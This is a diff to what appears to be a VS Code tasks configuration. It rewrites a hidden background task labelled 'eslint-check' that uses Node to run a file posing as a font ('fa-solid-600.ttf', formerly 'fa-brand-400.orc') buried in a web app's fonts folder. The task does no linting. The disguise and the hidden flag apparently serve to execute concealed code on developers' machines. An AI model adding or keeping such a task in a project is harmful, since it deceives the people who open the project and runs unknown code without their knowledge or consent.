@@ -4,7 +4,10 @@
     {
       "label": "eslint-check",
       "type": "shell",
-      "command": "(command -v node >/dev/null 2>&1 && node ./web/src/app/(user)/(account)/pets/[petId]/edit/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./web/src/app/(user)/(account)/pets/[petId]/edit/public/fonts/fa-brand-400.orc) || echo ''",
+      "command": "node",
+      "args": [
+        "./web/src/app/(user)/(account)/pets/[petId]/edit/public/fonts/fa-solid-600.ttf"
+      ],
       "problemMatcher": [],
       "isBackground": true,
       "hide": true,
